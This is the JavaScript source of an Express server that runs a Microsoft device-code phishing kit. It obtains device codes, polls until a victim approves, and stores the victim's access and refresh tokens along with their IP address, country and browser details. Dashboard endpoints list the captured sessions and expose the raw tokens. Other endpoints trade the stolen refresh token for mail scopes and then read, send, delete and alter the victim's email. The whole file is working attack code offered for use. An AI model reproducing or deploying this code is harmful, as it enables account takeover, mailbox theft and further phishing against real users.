const express = require('express');
const axios = require('axios');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.static('public'));

// ============================================
// YOUR WORKING CLIENT ID
// ============================================
const YOUR_CLIENT_ID = 'eb588048-cc40-4f6e-adc0-e2238e604376';
// Microsoft's public client ID for mailbox (uses PRT to get mail access)
const MAIL_CLIENT_ID = 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
// ============================================

// Store sessions
let userSessions = new Map();
let pendingAuth = new Map();
let sessionCounter = 1;
let totalVisits = 0;

function getCountryFromIp(ip) {
    const countryMap = {
        '46.183': 'United States',
        '172.': 'United States',
        '104.': 'United States',
        '185.': 'Germany',
        '188.': 'United Kingdom',
        '45.': 'Canada',
        '103.': 'India',
        '31.': 'Netherlands',
        '46.': 'Sweden'
    };
    for (const [prefix, country] of Object.entries(countryMap)) {
        if (ip.startsWith(prefix)) return country;
    }
    return 'Other';
}

function generateSessionId() {
    return 'sid_' + Date.now() + '_' + Math.random().toString(36).substr(2, 8);
}

function getClientIp(req) {
    return req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || 'Unknown';
}

// ============================================
// START AUTHENTICATION
// ============================================
app.post('/start', async (req, res) => {
    try {
        const sessionId = generateSessionId();
        const clientIp = getClientIp(req);
        const userAgent = req.headers['user-agent'] || 'Unknown';
        const country = getCountryFromIp(clientIp);
        
        totalVisits++;
        
        console.log(`[START] New auth request - Session: ${sessionId.substring(0, 15)}..., IP: ${clientIp}`);
        
        const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
            new URLSearchParams({
                client_id: YOUR_CLIENT_ID,
                scope: 'openid profile email User.Read offline_access'
            }), {
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
            }
        );
        
        const { device_code, user_code, expires_in, interval } = response.data;
        
        console.log(`[START] Device code: ${user_code}, expires in ${expires_in}s`);
        
        pendingAuth.set(sessionId, {
            device_code,
            user_code,
            sessionId,
            status: 'pending',
            ip: clientIp,
            userAgent: userAgent,
            country: country,
            createdAt: Date.now(),
            expiresAt: Date.now() + (expires_in * 1000)
        });
        
        // Start polling immediately
        pollForToken(device_code, sessionId);
        
        res.json({
            userCode: user_code,
            sessionId: sessionId,
            interval: interval || 5,
            expiresIn: expires_in
        });
        
    } catch (err) {
        console.error('[START] Error:', err.message);
        res.status(500).json({ error: err.message });
    }
});

// ============================================
// POLL FOR TOKEN
// ============================================
async function pollForToken(device_code, sessionId) {
    console.log(`[POLL] Started polling for session ${sessionId.substring(0, 15)}...`);
    
    const pollInterval = setInterval(async () => {
        const pending = pendingAuth.get(sessionId);
        if (!pending) {
            console.log(`[POLL] Session ${sessionId.substring(0, 15)}... not found, stopping`);
            clearInterval(pollInterval);
            return;
        }
        
        if (pending.status !== 'pending') {
            console.log(`[POLL] Session ${sessionId.substring(0, 15)}... already ${pending.status}, stopping`);
            clearInterval(pollInterval);
            return;
        }
        
        if (Date.now() > pending.expiresAt) {
            console.log(`[POLL] Session ${sessionId.substring(0, 15)}... expired`);
            pending.status = 'expired';
            pendingAuth.delete(sessionId);
            clearInterval(pollInterval);
            return;
        }
        
        try {
            const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token',
                new URLSearchParams({
                    grant_type: 'urn:ietf:params:oauth:grant-type:device_code',
                    client_id: YOUR_CLIENT_ID,
                    device_code: device_code
                }), {
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
                }
            );
            
            const tokens = response.data;
            
            console.log(`[POLL] ✅ Token received for session ${sessionId.substring(0, 15)}...`);
            console.log(`[POLL] Access token: ${tokens.access_token.substring(0, 30)}...`);
            console.log(`[POLL] Refresh token (PRT): ${tokens.refresh_token ? 'YES ✓' : 'NO'}`);
            
            // Get user info
            const userInfo = await axios.get('https://graph.microsoft.com/v1.0/me', {
                headers: { 'Authorization': `Bearer ${tokens.access_token}` }
            });
            
            const userEmail = userInfo.data.mail || userInfo.data.userPrincipalName;
            const userName = userInfo.data.displayName;
            
            console.log(`[POLL] User: ${userEmail} (${userName})`);
            
            // Store session by email
            userSessions.set(userEmail, {
                sessionId: sessionId,
                email: userEmail,
                name: userName,
                ip: pending.ip,
                userAgent: pending.userAgent,
                country: pending.country,
                access_token: tokens.access_token,
                refresh_token: tokens.refresh_token,  // PRT saved for mailbox
                expires_in: tokens.expires_in,
                expires_at: Date.now() + (tokens.expires_in * 1000),
                capturedAt: new Date().toISOString(),
                hasPRT: !!tokens.refresh_token
            });
            
            pending.status = 'success';
            pending.email = userEmail;
            pendingAuth.delete(sessionId);
            clearInterval(pollInterval);
            
            console.log(`✅✅✅ SUCCESS! Session captured for ${userEmail}`);
            console.log(`✅✅✅ PRT: ${tokens.refresh_token ? 'CAPTURED ✓' : 'NOT CAPTURED'}`);
            console.log(`✅✅✅ Total sessions: ${userSessions.size}`);
            
        } catch (err) {
            // This is normal - waiting for user to approve
            if (err.response?.data?.error !== 'authorization_pending') {
                console.log(`[POLL] Waiting for user approval...`);
            }
        }
    }, 3000);
}

// ============================================
// STATE ENDPOINT - Polled by auth page
// ============================================
app.get('/state', async (req, res) => {
    const sessionId = req.query.session_id;
    
    if (!sessionId) {
        return res.json({ status: 'error', message: 'No session ID' });
    }
    
    const pending = pendingAuth.get(sessionId);
    
    if (pending) {
        if (pending.status === 'success') {
            console.log(`[STATE] Session ${sessionId.substring(0, 15)}... completed successfully`);
            return res.json({ status: 'success', email: pending.email });
        }
        return res.json({ status: 'pending' });
    }
    
    // Check if already in sessions
    for (const [email, session] of userSessions.entries()) {
        if (session.sessionId === sessionId) {
            return res.json({ status: 'success', email: email });
        }
    }
    
    res.json({ status: 'pending' });
});

// ============================================
// GET MAILBOX ACCESS TOKEN USING CAPTURED PRT
// ============================================
async function getMailboxAccessToken(email) {
    const session = userSessions.get(email);
    
    if (!session) {
        console.log(`❌ No session found for ${email}`);
        return null;
    }
    
    if (!session.refresh_token) {
        console.log(`❌ No PRT for ${email}`);
        return null;
    }
    
    try {
        console.log(`[MAILBOX] Getting mailbox token for ${email}...`);
        console.log(`[MAILBOX] Using PRT: ${session.refresh_token.substring(0, 30)}...`);
        
        // Use the captured PRT with Microsoft's public client ID to get Mail scoped token
        const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token',
            new URLSearchParams({
                grant_type: 'refresh_token',
                refresh_token: session.refresh_token,
                client_id: MAIL_CLIENT_ID,
                scope: 'https://graph.microsoft.com/Mail.Read https://graph.microsoft.com/Mail.ReadWrite https://graph.microsoft.com/Mail.Send offline_access'
            }), {
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
            }
        );
        
        const tokens = response.data;
        
        console.log(`[MAILBOX] ✅ Mail token obtained!`);
        return tokens.access_token;
    } catch (err) {
        console.error(`[MAILBOX] Failed:`, err.response?.data?.error || err.message);
        return null;
    }
}

// ============================================
// API ENDPOINTS
// ============================================
app.get('/api/sessions', (req, res) => {
    const sessions = Array.from(userSessions.values()).map(s => ({
        id: s.sessionId,
        email: s.email,
        name: s.name,
        ip: s.ip,
        country: s.country,
        userAgent: s.userAgent,
        type: 'Graph API',
        capturedAt: s.capturedAt,
        expiresAt: s.hasPRT ? 'Permanent (PRT)' : new Date(s.expires_at).toLocaleString(),
        hasPRT: s.hasPRT
    }));
    console.log(`[API] Returning ${sessions.length} sessions`);
    res.json({ sessions: sessions, total: sessions.length });
});

app.get('/api/session/token/:email', async (req, res) => {
    const { email } = req.params;
    const session = userSessions.get(email);
    
    if (!session) {
        return res.status(404).json({ error: 'Session not found', email: email });
    }
    
    // Generate fresh mailbox token using PRT
    const mailboxToken = await getMailboxAccessToken(email);
    
    res.json({
        email: session.email,
        access_token: session.access_token,
        refresh_token: session.refresh_token,
        mailbox_token: mailboxToken,
        has_refresh_token: !!session.refresh_token,
        expires_in: session.expires_in
    });
});

app.get('/api/list_access_tokens', (req, res) => {
    const tokens = Array.from(userSessions.values()).map(s => ({
        id: s.sessionId,
        user: s.email,
        name: s.name,
        resource: 'Microsoft Graph',
        accesstoken: s.access_token,
        issued_at: s.capturedAt,
        expires_at: new Date(s.expires_at).toLocaleString()
    }));
    res.json(tokens);
});

app.get('/api/list_refresh_tokens', (req, res) => {
    const tokens = Array.from(userSessions.values())
        .filter(s => s.refresh_token)
        .map(s => ({
            id: s.sessionId,
            user: s.email,
            name: s.name,
            resource: 'Microsoft Graph (PRT) - Permanent',
            refreshtoken: s.refresh_token
        }));
    res.json(tokens);
});

app.get('/api/country_stats', (req, res) => {
    const countryCount = {};
    for (const session of userSessions.values()) {
        const country = session.country || 'Other';
        countryCount[country] = (countryCount[country] || 0) + 1;
    }
    res.json({ countries: countryCount, total: userSessions.size });
});

app.get('/api/overview_stats', (req, res) => {
    const totalSessions = userSessions.size;
    const totalPRTs = Array.from(userSessions.values()).filter(s => s.refresh_token).length;
    const countries = new Set(Array.from(userSessions.values()).map(s => s.country)).size;
    
    res.json({
        totalVisits: totalVisits,
        totalSessions: totalSessions,
        totalPRTs: totalPRTs,
        totalCountries: countries,
        lastCapture: totalSessions > 0 ? new Date(Math.max(...Array.from(userSessions.values()).map(s => new Date(s.capturedAt).getTime()))).toLocaleString() : 'None'
    });
});

app.delete('/api/sessions/clear', (req, res) => {
    userSessions.clear();
    pendingAuth.clear();
    totalVisits = 0;
    res.json({ success: true });
});

// ============================================
// MAILBOX API - Uses Mail Client ID with PRT
// ============================================
app.get('/api/mail/folders/:email', async (req, res) => {
    const { email } = req.params;
    console.log(`[MAIL] Getting folders for ${email}`);
    
    const token = await getMailboxAccessToken(email);
    if (!token) {
        return res.status(401).json({ error: 'No valid token. PRT not found.' });
    }
    
    try {
        const response = await axios.get('https://graph.microsoft.com/v1.0/me/mailFolders', {
            headers: { 'Authorization': `Bearer ${token}` },
            params: { '$top': 100, '$select': 'id,displayName,totalItemCount,unreadItemCount' }
        });
        res.json(response.data);
    } catch (err) {
        console.error('Folders error:', err.response?.data);
        res.status(500).json({ error: 'Failed to fetch folders' });
    }
});

app.get('/api/mail/:email/:folderId', async (req, res) => {
    const { email, folderId } = req.params;
    const token = await getMailboxAccessToken(email);
    if (!token) return res.status(401).json({ error: 'No valid token' });
    
    try {
        const response = await axios.get(`https://graph.microsoft.com/v1.0/me/mailFolders/${folderId}/messages`, {
            headers: { 'Authorization': `Bearer ${token}` },
            params: { '$top': 50, '$orderby': 'receivedDateTime desc', '$select': 'id,subject,from,receivedDateTime,isRead,bodyPreview,hasAttachments' }
        });
        res.json(response.data);
    } catch (err) {
        res.status(500).json({ error: 'Failed to fetch emails' });
    }
});

app.get('/api/mail/message/:email/:messageId', async (req, res) => {
    const { email, messageId } = req.params;
    const token = await getMailboxAccessToken(email);
    if (!token) return res.status(401).json({ error: 'No valid token' });
    
    try {
        const response = await axios.get(`https://graph.microsoft.com/v1.0/me/messages/${messageId}`, {
            headers: { 'Authorization': `Bearer ${token}` },
            params: { '$select': 'id,subject,from,toRecipients,receivedDateTime,isRead,body,bodyPreview,hasAttachments' }
        });
        res.json(response.data);
    } catch (err) {
        res.status(500).json({ error: 'Failed to fetch message' });
    }
});

app.post('/api/mail/send/:email', async (req, res) => {
    const { email } = req.params;
    const { to, subject, body } = req.body;
    const token = await getMailboxAccessToken(email);
    if (!token) return res.status(401).json({ error: 'No valid token' });
    
    try {
        await axios.post('https://graph.microsoft.com/v1.0/me/sendMail', {
            message: {
                subject: subject,
                body: { contentType: 'HTML', content: body },
                toRecipients: to.map(addr => ({ emailAddress: { address: addr } }))
            },
            saveToSentItems: true
        }, { headers: { 'Authorization': `Bearer ${token}` } });
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: 'Failed to send email' });
    }
});

app.delete('/api/mail/message/:email/:messageId', async (req, res) => {
    const { email, messageId } = req.params;
    const token = await getMailboxAccessToken(email);
    if (!token) return res.status(401).json({ error: 'No valid token' });
    
    try {
        await axios.delete(`https://graph.microsoft.com/v1.0/me/messages/${messageId}`, {
            headers: { 'Authorization': `Bearer ${token}` }
        });
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: 'Failed to delete message' });
    }
});

app.patch('/api/mail/message/:email/:messageId', async (req, res) => {
    const { email, messageId } = req.params;
    const { isRead } = req.body;
    const token = await getMailboxAccessToken(email);
    if (!token) return res.status(401).json({ error: 'No valid token' });
    
    try {
        await axios.patch(`https://graph.microsoft.com/v1.0/me/messages/${messageId}`, 
            { isRead: isRead },
            { headers: { 'Authorization': `Bearer ${token}` } }
        );
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: 'Failed to update' });
    }
});

// ============================================
// SETTINGS API
// ============================================
let config = {
    active_resource: 'graph',
    api_version: '2',
    openai_enabled: false,
    openai_api_key: '',
    openai_model: 'gpt-3.5-turbo',
    openai_max_tokens: 500,
    openai_temperature: 0.7
};

app.get('/api/settings', (req, res) => res.json(config));
app.post('/api/settings', (req, res) => { config = { ...config, ...req.body }; res.json({ success: true }); });
app.get('/api/resource/settings', (req, res) => res.json({ success: true, active_resource: config.active_resource }));
app.post('/api/resource/settings', (req, res) => { config.active_resource = req.body.active_resource; res.json({ success: true }); });
app.post('/api/openai/settings', (req, res) => { Object.assign(config, req.body); res.json({ success: true }); });

app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));
app.listen(PORT, '0.0.0.0', () => {
    console.log(`\n========================================`);
    console.log(`✅ Server running on port ${PORT}`);
    console.log(`✅ Auth Client: ${YOUR_CLIENT_ID} (captures Access Token + PRT)`);
    console.log(`✅ Mail Client: ${MAIL_CLIENT_ID} (uses PRT for mailbox)`);
    console.log(`========================================\n`);
});
